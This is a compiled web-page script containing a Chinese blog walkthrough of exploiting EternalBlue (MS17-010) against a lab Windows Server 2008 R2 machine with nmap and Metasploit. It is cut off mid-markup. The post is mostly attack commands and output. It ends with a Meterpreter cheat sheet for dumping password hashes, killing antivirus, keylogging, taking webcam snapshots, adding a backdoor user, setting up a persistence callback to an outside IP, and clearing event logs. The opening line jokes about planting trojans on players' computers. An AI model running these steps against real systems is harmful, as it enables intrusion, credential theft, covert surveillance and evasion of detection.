(window.webpackJsonp=window.webpackJsonp||[]).push([[127],{482:function(s,a,n){"use strict";n.r(a);var e=n(8),t=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("p",[s._v("乱拳捶死老师傅，给牢玩家电脑上都种上马子(汪汪)")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png",alt:"7"}})]),s._v(" "),a("h2",{attrs:{id:"漏洞原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞原理"}},[s._v("#")]),s._v(" 漏洞原理")]),s._v(" "),a("p",[s._v("永恒之蓝漏洞通过 TCP 的445和139端口，来利用 "),a("strong",[s._v("SMBv1")]),s._v(" 和 NBT 中的远程代码执行漏洞，通过恶意代码扫描并攻击开放445文件共享端口的 Windows 主机。只要用户主机开机联网，即可通过该漏洞控制用户的主机。可以在其电脑或服务器中植入勒索病毒、窃取用户隐私、远程控制木马等恶意程序")]),s._v(" "),a("p",[s._v("关键：445端口开启了"),a("strong",[s._v("SMBv1")]),s._v("文件共享服务(敏感特征)")]),s._v(" "),a("h2",{attrs:{id:"影响范围"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#影响范围"}},[s._v("#")]),s._v(" 影响范围")]),s._v(" "),a("p",[s._v("WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 2008、Windows 2008 R2、Windows Server 2012 SP0、Windows 7、Windows 8")]),s._v(" "),a("h2",{attrs:{id:"环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#环境"}},[s._v("#")]),s._v(" 环境")]),s._v(" "),a("p",[s._v("靶机：")]),s._v(" "),a("ul",[a("li",[s._v("windows server 2008 R2")]),s._v(" "),a("li",[s._v("IP: 192.168.237.146")])]),s._v(" "),a("p",[s._v("攻击机：")]),s._v(" "),a("ul",[a("li",[s._v("kali")]),s._v(" "),a("li",[s._v("IP: 192.168.237.128")])]),s._v(" "),a("h2",{attrs:{id:"利用"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#利用"}},[s._v("#")]),s._v(" 利用")]),s._v(" "),a("p",[s._v("nmap扫描同网段存活主机")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sS")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.0/24\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:01 CST\nNmap scan report for bogon (192.168.237.1)\nHost is up (0.00022s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n3306/tcp open  mysql\nMAC Address: 00:50:56:C0:00:08 (VMware)\n\nNmap scan report for bogon (192.168.237.2)\nHost is up (0.000062s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n53/tcp open  domain                                                                                                           \nMAC Address: 00:50:56:E6:05:63 (VMware)                                                                                       \n                                                                                                                              \nNmap scan report for bogon (192.168.237.146)                                                                                  \nHost is up (0.00029s latency).                                                                                                \nNot shown: 997 filtered tcp ports (no-response)                                                                               \nPORT      STATE SERVICE                                                                                                       \n135/tcp   open  msrpc                                                                                                         \n445/tcp   open  microsoft-ds                                                                                                  \n49154/tcp open  unknown\nMAC Address: 00:0C:29:10:87:59 (VMware)\n\nNmap scan report for bogon (192.168.237.254)\nHost is up (0.00017s latency).\nAll 1000 scanned ports on bogon (192.168.237.254) are in ignored states.\nNot shown: 1000 filtered tcp ports (no-response)\nMAC Address: 00:50:56:EE:8C:A5 (VMware)\n\nNmap scan report for bogon (192.168.237.128)\nHost is up (0.0000080s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 256 IP addresses (5 hosts up) scanned in 10.35 seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{staticClass:"line-number"},[s._v("32")]),a("br"),a("span",{staticClass:"line-number"},[s._v("33")]),a("br"),a("span",{staticClass:"line-number"},[s._v("34")]),a("br"),a("span",{staticClass:"line-number"},[s._v("35")]),a("br"),a("span",{staticClass:"line-number"},[s._v("36")]),a("br"),a("span",{staticClass:"line-number"},[s._v("37")]),a("br")])]),a("ul",[a("li",[a("p",[s._v("192.168.237.146是windows server 2008 R2  开启了445端口")])]),s._v(" "),a("li",[a("p",[s._v("192.168.237.128是kali")])]),s._v(" "),a("li",[a("p",[s._v("192.168.237.2是dns服务器")])]),s._v(" "),a("li",[a("p",[s._v("192.168.237.254是网关")])]),s._v(" "),a("li",[a("p",[s._v("192.168.237.1是物理主机")])])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/1.png",alt:"1"}})]),s._v(" "),a("p",[s._v("nmap扫描目标主机操作系统类型")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sV")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.146\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("拿到操作系统信息："),a("code",[s._v("Windows Server 2008 R2 - 2012;")])]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:22 CST\nNmap scan report for bogon (192.168.237.146)\nHost is up (0.00039s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT      STATE SERVICE      VERSION\n135/tcp   open  msrpc        Microsoft Windows RPC\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n49154/tcp open  msrpc        Microsoft Windows RPC\nMAC Address: 00:0C:29:10:87:59 (VMware)\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 58.16 seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/2.png",alt:"2"}})]),s._v(" "),a("p",[s._v("nmap自带脚本扫描目标主机可能存在的漏洞")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--script")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("vuln "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.146\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("该设备存在 "),a("code",[s._v("MS17-010")]),s._v(" 漏洞，即 "),a("code",[s._v("EternalBlue")]),s._v(" 漏洞")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-03 20:26 CST\nNmap scan report for bogon (192.168.237.146)\nHost is up (0.00034s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n445/tcp   open  microsoft-ds\n49154/tcp open  unknown\nMAC Address: 00:0C:29:10:87:59 (VMware)\n\nHost script results:\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143\n|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx\n|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED\n\nNmap done: 1 IP address (1 host up) scanned in 43.51 seconds\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/3.png",alt:"3"}})]),s._v(" "),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),a("p",[s._v("Metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具，因为只要掌握MSF的使用方法，每个人都可以使用MSF来攻击那些未打过补丁或者刚刚打过补丁的漏洞。")])]),s._v(" "),a("p",[s._v("使用"),a("code",[s._v("Metasploit Framework(MSF)")]),s._v("工具打靶，启动"),a("code",[s._v("msf")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("msfconsole\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("搜索永恒之蓝漏洞利用模块")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("search ms17_010\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("看到漏洞模块里的永恒之蓝漏洞")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/4.png",alt:"4"}})]),s._v(" "),a("p",[s._v("使用永恒之蓝漏洞模块")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("use "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("显示该漏洞模块配置项")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("show options\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/5.png",alt:"5"}})]),s._v(" "),a("p",[s._v("set命令设置靶机ip地址")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" rhost "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".237.146\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("使用"),a("code",[s._v("run")]),s._v("命令或者"),a("code",[s._v("exploit")]),s._v("命令执行漏洞利用")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("run\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/6.png",alt:"6"}})]),s._v(" "),a("p",[s._v("运行结束后，底部出现"),a("code",[s._v("meterpreter")]),s._v("，说明成功获取到目标主机的shell权限")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("[*] 192.168.237.146:445 - Sending egg to corrupted connection.\n[*] 192.168.237.146:445 - Triggering free of corrupted buffer.\n[*] Sending stage (201798 bytes) to 192.168.237.146\n[+] 192.168.237.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.237.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[+] 192.168.237.146:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\n[*] Meterpreter session 1 opened (192.168.237.128:4444 -> 192.168.237.146:49158) at 2024-12-03 20:52:38 +0800\n\nmeterpreter > \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("div",{staticClass:"custom-block tip"},[a("p",{staticClass:"custom-block-title"},[s._v("提示")]),s._v(" "),a("p",[s._v("运行成功会出现"),a("code",[s._v("meterpreter >")]),s._v("\nMeterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，\n对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。")])]),s._v(" "),a("p",[s._v("获取远程靶机的屏幕截图，使用"),a("code",[s._v("screenshot")]),s._v("命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/7.png",alt:"7"}})]),s._v(" "),a("p",[s._v("获取目标靶机shell，使用"),a("code",[s._v("shell")]),s._v("命令，使用"),a("code",[s._v("chcp 65001")]),s._v("可以解决终端乱码的问题")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("shell\nchcp "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("65001")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("拿到系统最高权限")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/8.png",alt:"8"}})]),s._v(" "),a("h2",{attrs:{id:"关于拿到权限后的渗透"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#关于拿到权限后的渗透"}},[s._v("#")]),s._v(" 关于拿到权限后的渗透")]),s._v(" "),a("p",[s._v("参考大佬给出的命令，做点恶趣味。"),a("strong",[s._v("抱歉，有权限是真的可以为所欲为(汪汪)")])]),s._v(" "),a("p",[s._v("在meterpreter >中，我们可以使用以下命令来实现对目标的操作")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sysinfo             "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标主机系统信息")]),s._v("\nrun scraper         "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标主机详细信息")]),s._v("\nrun hashdump        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#导出密码的哈希")]),s._v("\nload kiwi           "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#加载")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v("                  "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标主机进程信息")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("pwd")]),s._v("                 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标当前目录(windows)")]),s._v("\ngetlwd              "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标当前目录(Linux)")]),s._v("\nsearch "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" *.jsp "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-d")]),s._v(" e:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("                "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#搜索E盘中所有以.jsp为后缀的文件")]),s._v("\ndownload  e:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("test.txt  /root          "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将目标机的e:\\test.txt文件下载到/root目录下")]),s._v("\nupload    /root/test.txt d:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("test      "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将/root/test.txt上传到目标机的 d:\\test\\ 目录下getpid              #查看当前Meterpreter Shell的进程")]),s._v("\nPIDmigrate "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1384")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将当前Meterpreter Shell的进程迁移到PID为1384的进程上")]),s._v("\nidletime            "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看主机运行时间")]),s._v("\ngetuid              "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看获取的当前权限")]),s._v("\ngetsystem           "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#提权")]),s._v("\nrun  killav         "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#关闭杀毒软件")]),s._v("\nscreenshot          "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#截图")]),s._v("\nwebcam_list         "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看目标主机的摄像头")]),s._v("\nwebcam_snap         "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#拍照")]),s._v("\nwebcam_stream       "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开视频")]),s._v("\nexecute  参数  "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" 可执行文件   "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#执行可执行程序")]),s._v("\nrun getgui "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" hack "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v("    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#创建hack用户，密码为123")]),s._v("\nrun getgui "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v("                "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开启远程桌面")]),s._v("\nkeyscan_start                "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开启键盘记录功能")]),s._v("\nkeyscan_dump                 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#显示捕捉到的键盘记录信息")]),s._v("\nkeyscan_stop                 "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#停止键盘记录功能")]),s._v("\nuictl  disable  keyboard     "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#禁止目标使用键盘")]),s._v("\nuictl  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("enable")]),s._v("   keyboard     "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#允许目标使用键盘")]),s._v("\nuictl  disable  mouse        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#禁止目标使用鼠标")]),s._v("\nuictl  "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("enable")]),s._v("   mouse        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#允许目标使用鼠标")]),s._v("\nload                         "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#使用扩展库")]),s._v("\nrun                          "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#使用扩展库")]),s._v("\nrun persistence "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-X")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("5")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8888")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-r")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".10.27        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#反弹时间间隔是5s 会自动连接")]),s._v("\n                                   "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".27的4444端口，缺点是容易被杀毒软件查杀\nportfwd "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-r")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".11.13 "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v("     "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址")]),s._v("\nclearev                       "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#清除日志")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br"),a("span",{